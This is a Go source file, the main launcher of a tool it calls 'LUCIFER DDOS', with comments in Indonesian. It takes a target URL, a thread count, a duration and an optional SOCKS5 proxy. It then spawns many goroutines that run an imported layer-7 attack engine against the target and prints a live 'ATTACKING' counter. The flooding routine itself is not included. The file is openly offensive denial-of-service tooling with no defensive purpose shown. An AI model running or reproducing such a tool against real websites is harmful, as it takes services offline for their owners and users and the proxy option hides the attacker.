package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"lucifer/engine" 
)

const (
	reset  = "\033[0m"
	bold   = "\033[1m"
	red    = "\033[31m"
	green  = "\033[32m"
	yellow = "\033[33m"
	cyan   = "\033[36m"
	dim    = "\033[2m"
)

func main() {
	// Flagging System
	target := flag.String("u", "", "URL Target (contoh: https://google.com/)")
	proxy := flag.String("p", "", "Proxy SOCKS5 (contoh: 127.0.0.1:9050)")
	threads := flag.Int("t", 100, "Threads (Goroutines)")
	duration := flag.Int("d", 60, "Durasi serangan dalam detik")
	flag.Parse()

	// Validasi Input
	if *target == "" {
		printBanner()
		fmt.Println(red + " [!] Error: Target URL wajib diisi bro!" + reset)
		fmt.Println(yellow + " Usage: go run main.go -u <url> -t <threads> -d <seconds> -p <proxy>" + reset)
		os.Exit(1)
	}

	// Pastikan URL rapi
	if !strings.HasPrefix(*target, "http") {
		*target = "https://" + *target
	}

	printBanner()
	fmt.Printf("%s[+] Target   :%s %s\n", bold, reset, *target)
	fmt.Printf("%s[+] Threads  :%s %d\n", bold, reset, *threads)
	fmt.Printf("%s[+] Duration :%s %d detik (%d menit)\n", bold, reset, *duration, *duration/60)
	if *proxy != "" {
		fmt.Printf("%s[+] Proxy    :%s %s\n", bold, reset, *proxy)
	}
	fmt.Println(dim + "----------------------------------------------------" + reset)

	stop := make(chan bool)
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Spawning Engine
	for i := 0; i < *threads; i++ {
		go engine.RunL7(*target, *proxy, stop)
	}

	// Timer & Monitoring ala Slayer
	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-stop:
				return
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				remaining := float64(*duration) - elapsed
				if remaining < 0 {
					remaining = 0
				}
				fmt.Printf("\r %s[%sLIVE%s] Running: %.0fs | Remaining: %.0fs | Status: %sATTACKING%s", 
					dim, green, reset, elapsed, remaining, bold+red, reset)
			}
		}
	}()

	// Wait for duration or signal
	select {
	case <-time.After(time.Duration(*duration) * time.Second):
		fmt.Println("\n\n" + green + " [+] Time's up! Attack finished successfully." + reset)
	case <-sigChan:
		fmt.Println("\n\n" + yellow + " [!] Manual stop detected. Cleaning up..." + reset)
	}

	close(stop)
	time.Sleep(1 * time.Second) // Kasih jeda buat cleanup goroutine
	fmt.Println(bold + " [!] Lucifer Offline." + reset)
}

func printBanner() {
	fmt.Println(bold + red + `
  _     _   _  ____ ___ _____ _____ ____  
 | |   | | | |/ ___|_ _|  ___| ____|  _ \ 
 | |   | | | | |    | || |_  |  _| | |_) |
 | |___| |_| | |___ | ||  _| | |___|  _ < 
 |_____|\___/ \____|___|_|   |_____|_| \_\ ` + reset)
	fmt.Println(dim + "    --- LUCIFER DDOS ---" + reset + "\n")
}